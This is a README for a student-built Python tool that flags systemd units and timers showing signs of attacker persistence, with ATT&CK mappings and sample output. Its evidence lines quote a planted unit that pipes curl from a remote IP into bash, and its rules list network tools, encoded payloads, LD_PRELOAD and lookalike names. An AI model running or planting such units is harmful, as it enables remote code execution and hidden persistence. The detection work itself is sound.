# persistwatch

Scans a directory of systemd unit and timer files and flags the ones that look
like persistence. Pure Python standard library, no install step, readable
report or JSON.

Getting a shell is the easy part of an attack. Keeping it is the part that
leaves evidence on disk, and on a modern Linux box that evidence is almost
always a systemd unit or a timer. `persistwatch` reads those files and tells you
which ones do not look like something a package manager installed.

I wrote this while working through the Linux side of my
[purple-team-journey](https://github.com/Siddique-12300983/purple-team-journey)
lab. Dropping a unit in `/etc/systemd/system` takes one command, so I wanted a
tool that does the first pass over those files instead of me reading all of
them by eye.

## Why it matters

A malicious unit does not look exotic. It looks like a normal unit with one
field out of place: an `ExecStart` under `/tmp`, a name one character away from
a real service, a timer that fires every thirty seconds so the payload comes
straight back after you kill it. Each of those is boring on its own and obvious
once something points at it, which is exactly the kind of work to automate.

## What it detects

| Rule | Signal | Severity | ATT&CK |
|---|---|---|---|
| `exec_from_suspicious_path` | `ExecStart` runs a binary from `/tmp`, `/dev/shm`, `/var/tmp`, `/home`, `/run/user` and friends | high | T1543.002 |
| `exec_shell_wrapped` | `ExecStart` passes an inline command to a shell or interpreter (`sh -c`, `python3 -c`) | high | T1059.004 |
| `exec_network_download` | `ExecStart` calls `curl`, `wget`, `nc`, `socat`; high when the output is piped into another command | high / medium | T1543.002 |
| `exec_encoded_payload` | `ExecStart` contains `base64`, `eval`, `xxd` or similar, hiding what actually runs | high | T1027 |
| `ld_preload` | The unit sets `LD_PRELOAD` or `LD_LIBRARY_PATH` for its own process | high | T1574.006 |
| `world_writable_unit` | The unit file itself is world-writable, so any user can change what root runs | high | T1543.002 |
| `world_writable_target` | The binary the unit runs is world-writable on disk | high | T1543.002 |
| `lookalike_name` | The unit name is one or two characters off a real system unit | high | T1036.005 |
| `exec_relative_path` | `ExecStart` is a relative path, so which binary runs depends on `PATH` | medium | T1543.002 |
| `timer_high_frequency` | A timer fires more often than the threshold, which works as a re-infection loop | medium | T1053.006 |
| `hidden_unit_file` | The filename starts with a dot, so it does not show in a plain `ls` | medium | T1564.001 |
| `timer_without_unit` | A timer triggers a unit that is not in the scanned directory | low | T1053.006 |
| `recently_modified` | The unit changed inside the lookback window (7 days by default) | low | T1543.002 |
| `install_without_description` | Set to start at boot but has no `Description`, unlike packaged units | low | T1543.002 |

`recently_modified` is deliberately low. On its own it means nothing, because
every unit is recent on a freshly built machine. It earns its place by sitting
next to a high finding on the same unit, which is when "and it was written two
hours ago" starts to matter.

## Install

None needed. Python 3.9 or newer, standard library only.

```sh
git clone https://github.com/Siddique-12300983/persistwatch.git
cd persistwatch
python3 -m persistwatch --list-rules
```

## Usage

```sh
# the directory that ships with the repo
python3 -m persistwatch samples/systemd-sample

# a real machine (read-only, no root needed for the system path)
python3 -m persistwatch /etc/systemd/system

# several directories at once, high severity only
python3 -m persistwatch /etc/systemd/system /usr/lib/systemd/system --min-severity high

# machine readable, for a pipeline
python3 -m persistwatch /etc/systemd/system --json > findings.json
```

| Flag | What it does |
|---|---|
| `--json` | Print JSON instead of the report |
| `--min-severity {low,medium,high}` | Hide findings below this level (default `low`) |
| `--recent-days N` | Lookback for `recently_modified`, `0` turns it off (default `7`) |
| `--timer-threshold SECONDS` | Flag timers firing more often than this (default `120`) |
| `--disable RULE` | Turn off one rule, repeatable |
| `--no-recursive` | Do not walk into subdirectories |
| `--exit-zero` | Always exit `0`, even with findings |
| `--list-rules` | List the rules and the techniques they map to |

Exit codes: `0` nothing found, `1` findings at or above `--min-severity`, `2` an
error. That makes it usable as a cron or CI check.

## Example output

`samples/systemd-sample` is a small `/etc/systemd/system` with five ordinary
units and four planted ones. Only the planted four are reported.

```
$ python3 -m persistwatch samples/systemd-sample --recent-days 0
persistwatch report
------------------------------------------------------------------------
scanned      : samples/systemd-sample
units parsed : 9
findings     : 10  (high 5, medium 4, low 1)
min severity : low

[!!] .cert-renew.service
     samples/systemd-sample/.cert-renew.service
     high   exec_network_download        T1543.002
            ExecStart calls curl and chains the output into another command
            evidence: ExecStart=/bin/sh -c "curl -fsSL http://198.51.100.20/r.sh | bash"
     high   exec_shell_wrapped           T1059.004
            ExecStart runs an inline command through sh instead of a real executable
            evidence: ExecStart=/bin/sh -c "curl -fsSL http://198.51.100.20/r.sh | bash"
     medium hidden_unit_file             T1564.001
            the filename starts with a dot, so it does not show in a plain ls
            evidence: .cert-renew.service

[!!] motd-update.service
     samples/systemd-sample/motd-update.service
     high   ld_preload                   T1574.006
            the unit sets a dynamic linker variable for its process
            evidence: Environment=LD_PRELOAD=/var/tmp/.libmotd.so
     medium exec_relative_path           T1543.002
            ExecStart is a relative path, so which binary runs depends on PATH
            evidence: ExecStart=update-motd --quiet
     low    install_without_description  T1543.002
            set to start at boot but has no Description, unlike packaged units
            evidence: [Install] present, Unit.Description missing

[!!] systemd-journalid.service
     samples/systemd-sample/systemd-journalid.service
     high   exec_from_suspicious_path    T1543.002
            ExecStart runs a binary from /dev/shm, which a packaged service should not do
            evidence: ExecStart=/dev/shm/.journalid -q
     high   lookalike_name               T1036.005
            the name is one or two characters away from the real unit systemd-journald.service
            evidence: systemd-journalid.service vs systemd-journald.service

[!] cert-renew.timer
     samples/systemd-sample/cert-renew.timer
     medium timer_high_frequency         T1053.006
            fires every 60 seconds, which is often enough to restart a payload as fast as it is killed
            evidence: OnUnitActiveSec=60s
     medium timer_high_frequency         T1053.006
            fires every 20 seconds, which is often enough to restart a payload as fast as it is killed
            evidence: OnBootSec=20s

MITRE ATT&CK techniques seen
------------------------------------------------------------------------
  T1036.005    Masquerading: Match Legitimate Name or Location
  T1053.006    Scheduled Task/Job: Systemd Timers
  T1059.004    Command and Scripting Interpreter: Unix Shell
  T1543.002    Create or Modify System Process: Systemd Service
  T1564.001    Hide Artifacts: Hidden Files and Directories
  T1574.006    Hijack Execution Flow: Dynamic Linker Hijacking
```

`systemd-journalid.service` is the one to look at first. The real unit is
`systemd-journald.service`, with no `i`, and the real one does not run anything
out of `/dev/shm`.

### JSON

```json
{
  "tool": "persistwatch",
  "scanned": ["samples/systemd-sample"],
  "min_severity": "low",
  "summary": {
    "units_parsed": 9,
    "findings": 10,
    "high": 5,
    "medium": 4,
    "low": 1,
    "units_with_findings": 4
  },
  "techniques": ["T1027", "T1036.005", "T1053.006", "T1059.004", "T1543.002", "T1564.001", "T1574.006"],
  "findings": [
    {
      "unit": ".cert-renew.service",
      "path": "samples/systemd-sample/.cert-renew.service",
      "rule": "exec_network_download",
      "severity": "high",
      "technique": "T1543.002",
      "message": "ExecStart calls curl and chains the output into another command",
      "evidence": "ExecStart=/bin/sh -c \"curl -fsSL http://198.51.100.20/r.sh | bash\""
    }
  ]
}
```

## MITRE ATT&CK mapping

| Technique | Name | How this tool sees it |
|---|---|---|
| [T1543.002](https://attack.mitre.org/techniques/T1543/002/) | Create or Modify System Process: Systemd Service | A unit whose `ExecStart`, path or permissions do not match a packaged service |
| [T1053.006](https://attack.mitre.org/techniques/T1053/006/) | Scheduled Task/Job: Systemd Timers | A timer firing often enough to re-launch a payload, or pointing at a unit that is not there |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Command and Scripting Interpreter: Unix Shell | A unit that is really a shell one-liner runner |
| [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | Masquerading: Match Legitimate Name or Location | A unit name that is a near miss for a real system unit |
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | An `ExecStart` that decodes or evaluates its own payload |
| [T1574.006](https://attack.mitre.org/techniques/T1574/006/) | Hijack Execution Flow: Dynamic Linker Hijacking | A unit setting `LD_PRELOAD` for its own process |
| [T1564.001](https://attack.mitre.org/techniques/T1564/001/) | Hide Artifacts: Hidden Files and Directories | A dotfile unit that a plain `ls` will not show |

A note on IDs, since it is easy to get wrong: systemd timers are **T1053.006**.
T1053.005 is Scheduled Task, which is the Windows one. Cron is T1053.003.

## Tests

Standard library `unittest`, no test dependencies:

```sh
python3 -m unittest discover -s tests -t .
```

86 tests covering the parser, every rule, and the CLI. `tests/fixtures/clean`
holds four ordinary units that must stay silent, which is the test that actually
catches a noisy rule, and `tests/fixtures/suspicious` holds seven units that
between them trigger eleven rules. The permission and mtime rules build their
own files in a temp directory so they do not depend on what git checked out.

## Limitations, honestly

- It reads unit **files**. It does not talk to `systemctl`, so a unit that is
  installed but masked, or a transient unit that only exists in memory, is out
  of scope.
- `world_writable_target` can only check a binary that exists on the machine
  running the scan, which is why offline triage of a copied directory will not
  report it.
- Cron, `~/.bashrc`, `/etc/rc.local` and at jobs are other common Linux
  persistence spots and are not covered yet. Systemd was the one worth doing
  first and properly.
- No rule here is proof of anything. Every finding is "look at this", not
  "you are compromised".

## Related work of mine

- [log-analyzer](https://github.com/Siddique-12300983/log-analyzer) finds the
  brute force that got the attacker in.
- `persistwatch` finds how they stayed.
- [sigma-detection-rules](https://github.com/Siddique-12300983/sigma-detection-rules)
  turns that into SIEM rules.
- [attack-coverage-map](https://github.com/Siddique-12300983/attack-coverage-map)
  shows which ATT&CK techniques all of the above actually cover.

## License

MIT. See [LICENSE](LICENSE).

---

Built by **ruxchipher** (Md Abu Bakar Siddique), second-year cyber security
student working toward a purple team role.
[ruxchipher.com](https://ruxchipher.com) ·
[GitHub](https://github.com/Siddique-12300983) ·
[LinkedIn](https://linkedin.com/in/siddiqueabu)
